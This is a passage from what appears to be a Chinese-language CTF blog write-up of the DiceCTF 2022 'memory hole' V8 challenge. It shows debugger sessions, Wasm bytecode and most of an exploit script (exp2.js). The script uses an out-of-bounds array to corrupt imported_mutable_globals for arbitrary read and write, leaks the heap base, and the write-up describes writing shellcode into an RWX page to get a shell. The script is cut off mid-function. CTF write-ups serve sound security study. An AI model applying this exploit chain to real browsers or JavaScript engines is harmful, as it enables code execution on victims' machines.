class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode),&#123; <span class="attr">js</span>: &#123;<span class="variable language_">global</span>&#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">WasmJSFunction</span> = wasmInstance.<span class="property">exports</span>.<span class="property">func</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmInstance);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(<span class="variable language_">global</span>);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-1.png"></p>
<p>结合<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-objects.h;l=289">源码 wasm-objects.h - Chromium Code Search</a>看到<code>untagged_buffer</code>也是一种<code>ArrayBuffer</code>，表示 Wasm 全局变量所用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Representation of a WebAssembly.Global JavaScript-level object.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WasmGlobalObject</span></span><br><span class="line">    : <span class="keyword">public</span> TorqueGeneratedWasmGlobalObject&lt;WasmGlobalObject, JSObject&gt; &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">DECL_ACCESSORS</span>(untagged_buffer, JSArrayBuffer)</span><br><span class="line">  <span class="built_in">DECL_ACCESSORS</span>(tagged_buffer, FixedArray)</span><br><span class="line">  <span class="built_in">DECL_PRIMITIVE_ACCESSORS</span>(type, wasm::ValueType)</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-2.png"></p>
<p>可以看到全局变量的值存到了<code>backing_store</code>指向的内存。但是回头看 Instance 发现 <code>imported_mutable_globals</code>还是未指向添加的全局变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0xc83081d2a09</span></span><br><span class="line">0xc83081d2a09: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x0c8308206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> ···</span><br><span class="line"> - imported_function_targets: 0x55b868265a80</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55b868265aa0</span><br><span class="line"> ···</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-3.png"></p>
<p>原因是这段 Wasm code 中并未使用这个全局变量。那接下来就是去找一下如何写 Wasm code 并且使用全局变量。</p>
<p>在 <a href="https://github.com/mdn/webassembly-examples/tree/master/js-api-examples">webassembly-examples&#x2F;js-api-examples at master · mdn&#x2F;</a> 中找到 global.wat：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(module</span><br><span class="line">  (global $g (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i32))</span><br><span class="line">  (func (export <span class="string">&quot;getGlobal&quot;</span>) (result i32)</span><br><span class="line">    (global.get $g)</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;incGlobal&quot;</span>)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (i32.add (global.get $g) (i32.<span class="type">const</span> <span class="number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>（看着这语法总有一种说不出来的感觉）</p>
<p>这里就直接用 <a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">kylebot’s Blog</a> 中的 wat，使用 <a href="https://github.com/WebAssembly/wabt">WebAssembly&#x2F;wabt</a> 编译 wat 得到 wasmcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.wat</span></span><br><span class="line">(module</span><br><span class="line">  (global $g (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i64))</span><br><span class="line">  (func (export <span class="string">&quot;getGlobal&quot;</span>) (result i64)</span><br><span class="line">    (global.get $g)</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;incGlobal&quot;</span>)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (i64.add (global.get $g) (i64.<span class="type">const</span> <span class="number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;setGlobal&quot;</span>) (param $a i64)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (local.get $a))</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">$ bin/wat2wasm ./test.wat</span><br></pre></td></tr></table></figure>

<p>即得到 test.wasm：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0061 736d 0100 0000 010c 0360 0001 7e60</span><br><span class="line">0000 6001 7e00 020e 0102 6a73 0667 6c6f</span><br><span class="line">6261 6c03 7e01 0304 0300 0102 0725 0309</span><br><span class="line">6765 7447 6c6f 6261 6c00 0009 696e 6347</span><br><span class="line">6c6f 6261 6c00 0109 7365 7447 6c6f 6261</span><br><span class="line">6c00 020a 1703 0400 2300 0b09 0023 0042</span><br><span class="line">017c 2400 0b06 0020 0024 000b</span><br></pre></td></tr></table></figure>

<p>稍作处理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var global = new WebAssembly.Global(&#123;value:&#x27;i64&#x27;, mutable:true&#125;, 256n);</span><br><span class="line">let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);</span><br><span class="line"></span><br><span class="line">let wasmInstance = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),&#123; js: &#123;global&#125; &#125;);</span><br><span class="line">var WasmJSFunction = wasmInstance.exports.incGlobal;</span><br><span class="line"></span><br><span class="line">WasmJSFunction();</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">%DebugPrint(global);</span><br><span class="line">%SystemBreak();</span><br><span class="line">WasmJSFunction();</span><br></pre></td></tr></table></figure>

<p>调试看到 <code>imported_mutable_globals</code>指向了存储 global 的内存，并且由于在 <code>%DebugPrint</code> 之前就调用了一次 inc，此时的值为 0x101：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x3771081d2a51: [WasmInstanceObject] in OldSpace</span><br><span class="line"> ···</span><br><span class="line"> - imported_function_targets: 0x55fb88e4e980</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55fb88e4e9a0</span><br><span class="line"> </span><br><span class="line">DebugPrint: 0x377108048839: [WasmGlobalObject]</span><br><span class="line"> - map: 0x377108206821 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - untagged_buffer: 0x37710804885d &lt;ArrayBuffer map = 0x377108203289&gt;</span><br><span class="line"> - offset: 0</span><br><span class="line"> - raw_type: 2</span><br><span class="line"> - is_mutable: 1</span><br><span class="line"> - type: i64</span><br><span class="line"> - is_mutable: 1</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-4.png"></p>
<p>此时我们手动修改 WasmInstance 中的 <code>imported_mutable_globals</code> 字段的值，再继续运行调用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set &#123;long&#125;0x3771081d2aa0=0x4141414141414141</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-5.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-6.png"></p>
<p>发现 crash 到了这里，结合下面的两行汇编和前面的调试，可以得出 V8 将这个值作为一个指针的指针，解两层引用后取出真正的 global 的值（证实一开始看源码的猜测）。<strong>最重要的是这个过程的地址都是 64 位的，相当于没有了沙箱。所以接下来就是利用 oob 篡改 <code>imported_mutable_globals</code> 的值，通过这个类似以前经常使用的 backing_store 指针一样完成任意读写。有两个区别就是一：该字段并不是对象，伪造起来很容易，二就是两层引用才是真正任意写的地址。</strong>所以综上可以 fake 一个数组，数组的第一个元素是可读可写的地址（充当 <code>backing_store</code> 的角色 ）。由于数组的地址还是由基址 + 偏移组成，偏移可以比较好泄露。重点是泄露 js 基址。</p>
<blockquote>
<p>注意 js 的位运算符在运算时操作数被转换为 32bit 整數，以位序列（0 和 1 组成）表示。若超過 32bits，則取低位 32bit，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Before: <span class="number">11100110111110100000000000000110000000000001</span></span><br><span class="line">After:              <span class="number">10100000000000000110000000000001</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>我这里直接修改了 base 为 1，与 externel 相加正好为 8，从 js_base + 8 处开始泄露，这附近有很多 js_base 相关的地址，随便选一个就好。</p>
<p><img src="/img/Dicectf2022-memoryhole/2-15.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-16.png"></p>
<blockquote>
<p>开辟的 Uint32Array 的长度会影响其地址是 4 的倍数还是从 8 的倍数，所以奇数达不到目的就尝试偶数</p>
<p>var leak_arr &#x3D; new Uint32Array(0xe);</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">var</span> leak_arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="title class_">Uint32Array</span>_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据 length 字段找到 btyelength、base_pointer 字段相对于 oob 数组的 index</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="title class_">Uint32Array</span>_len || low == <span class="title class_">Uint32Array</span>_len) &#123;</span><br><span class="line">        <span class="title class_">Uint32Array</span>_len_idx = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Uint32Array_len_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(<span class="title class_">Uint32Array</span>_len_idx));</span><br><span class="line"><span class="comment">// base pointer in high word</span></span><br><span class="line"><span class="keyword">var</span> base_pointer_idx = <span class="title class_">Uint32Array</span>_len_idx + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> byte_length_idx = <span class="title class_">Uint32Array</span>_len_idx - <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>遇到一些玄学问题，跑两次 gc 尝试一下，尤其是内存不对齐。</p>
</blockquote>
<p>修改完对应字段的数据，即可泄露 js_base。</p>
<p>接着是通过对象来实现 addressOf。这里借助了一个哨兵值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> leak = &#123;<span class="attr">guard</span>: <span class="number">0x2333</span>, <span class="attr">obj</span>: fake_mutable_globals&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_leak_offset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i ++) &#123;</span><br><span class="line">        <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">        <span class="keyword">var</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> high;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (high == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            fake_mutable_globals_elements_arr_idx = i - <span class="number">4</span>;</span><br><span class="line">            <span class="title function_">d22u</span>(vuln_arr[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    leak[<span class="string">&#x27;obj&#x27;</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">find_leak_offset</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>类似使用一些标记或哨兵值来寻找地址的方式比较通用，哪怕写到一半发现需要添加一些对象改变了内存布局也不需要再次调试来一个一个找要用的偏移</p>
</blockquote>
<p>首先泄露 <strong>准备要用作 <code>imported_mutable_globals</code> 的 fake 数组的地址，然后拿到其真正的 elements 地址，</strong>然后泄露 wasmInstance 的地址，计算一下偏移就可以得到 <code>imported_mutable_globals</code> 字段在 wasmInstance 中的位置。然后通过 oob 数组的越界写，直接覆写 <code>imported_mutable_globals</code> 为 fake 数组的 elements 地址。泄露地址与篡改 <code>imported_mutable_globals</code> ：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-11.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-7.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-8.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-9.png"></p>
<p>但是  <code>imported_mutable_globals</code> 的地址与 oob 数组 elements 的偏移并不总是 8 的倍数，就会出现如下的情况：</p>
<p><img src="/img/Dicectf2022-memoryhole/2-10.png"></p>
<p>所以针对这种情况还需要处理，在前一个字段的高位写目标地址的低字节，后一个字段的低位写目标地址的高字节，这样拼起来中间的   <code>imported_mutable_globals</code> 就合法了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!split)</span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(target_addr);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] split!!!&quot;</span>);</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[imported_mutable_globals_index + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> pad1 = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> high = js_base / <span class="number">0x100000000</span> <span class="comment">// + (pad1 * 0x100000000);</span></span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(arr_in_fake_mutable_globals_addr * <span class="number">0x100000000</span>);</span><br><span class="line">    vuln_arr[imported_mutable_globals_index + <span class="number">1</span>] = <span class="title function_">u2d</span>(high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时 <code>imported_mutable_globals</code> 的值已经为 fake 数组的 elements 的地址，那么arbRead 和 arbWrite 的实现就是对该数组的第一个字段赋值为要读写的地址。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getGlobal</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">setGlobal</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个 wasmInstance_attack，即平时常用的，在 wasmInstance_attack + 0x60 处存放了 rwx 页，泄露该地址准备一会向其中写入 shellcode。</p>
<p>利用 arbWrite() 写 shellcode 到 rwx 页：</p>
<p><img src="/img/Dicectf2022-memoryhole/shellcode.png"></p>
<p>最终调用 f() 拿到shell：</p>
<p><img src="/img/Dicectf2022-memoryhole/res.png"></p>
<h2 id="exp2-js"><a href="#exp2-js" class="headerlink" title="exp2.js"></a>exp2.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> __buf8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> __dvCvt = <span class="keyword">new</span> <span class="title class_">DataView</span>(__buf8);</span><br><span class="line"><span class="keyword">const</span> __bigInt = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(__buf8);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 =&gt; double</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp0 = val &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">var</span> tmp1 = (val - tmp0) / <span class="number">0x100000000</span>;</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">0</span>, tmp0, <span class="literal">true</span>);</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">4</span>, tmp1, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d22u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __bigInt[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>) + __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hex</span> = (<span class="params">x</span>) =&gt; (<span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">js_heap_defragment</span>(<span class="params"></span>) &#123; <span class="comment">// used for stable fake JSValue crafting</span></span><br><span class="line">    <span class="title function_">gc</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// js_heap_defragment();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals_elements_arr_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> vuln_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len_idx = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">var</span> leak_arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="title class_">Uint32Array</span>_len);</span><br><span class="line"><span class="keyword">var</span> fake_mutable_globals = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> leak = &#123;<span class="attr">guard</span>: <span class="number">0x2333</span>, <span class="attr">obj</span>: fake_mutable_globals&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123;<span class="attr">value</span>:<span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">256n</span>);</span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">126</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">1</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">6</span>, <span class="number">103</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">3</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">71</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">124</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode),&#123; <span class="attr">js</span>: &#123;<span class="variable language_">global</span>&#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> getGlobal = wasmInstance.<span class="property">exports</span>.<span class="property">getGlobal</span>;</span><br><span class="line"><span class="keyword">var</span> setGlobal = wasmInstance.<span class="property">exports</span>.<span class="property">setGlobal</span>;</span><br><span class="line"></span><br><span class="line">vuln_arr.<span class="title function_">setLength</span>(<span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="title class_">Uint32Array</span>_len || low == <span class="title class_">Uint32Array</span>_len) &#123;</span><br><span class="line">        <span class="title class_">Uint32Array</span>_len_idx = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Uint32Array_len_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(<span class="title class_">Uint32Array</span>_len_idx));</span><br><span class="line"><span class="comment">// base pointer in high word</span></span><br><span class="line"><span class="keyword">var</span> base_pointer_idx = <span class="title class_">Uint32Array</span>_len_idx + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> byte_length_idx = <span class="title class_">Uint32Array</span>_len_idx - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">d22u</span>(vuln_arr[<span class="title class_">Uint32Array</span>_len_idx]);</span><br><span class="line"><span class="keyword">const</span> pad = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">vuln_arr[base_pointer_idx] = <span class="title function_">u2d</span>(<span class="number">0x100000000</span>);</span><br><span class="line">vuln_arr[byte_length_idx] = <span class="title function_">u2d</span>(<span class="number">0x1000</span>);</span><br><span class="line">vuln_arr[<span class="title class_">Uint32Array</span>_len_idx] = <span class="title function_">u2d</span>((<span class="number">0x1000</span> / <span class="number">4</span>) * <span class="number">0x100000000</span> + pad);</span><br><span class="line"><span class="keyword">var</span> js_base = leak_arr[<span class="number">5</span>] * <span class="number">0x100000000</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] js_base =&gt; &quot;</span> + <span class="title function_">hex</span>(js_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_leak_offset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i ++) &#123;</span><br><span class="line">        <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">        <span class="keyword">var</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (low == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> high;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (high == <span class="number">0x4666</span>) &#123;</span><br><span class="line">            fake_mutable_globals_elements_arr_idx = i - <span class="number">4</span>;</span><br><span class="line">            <span class="title function_">d22u</span>(vuln_arr[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> 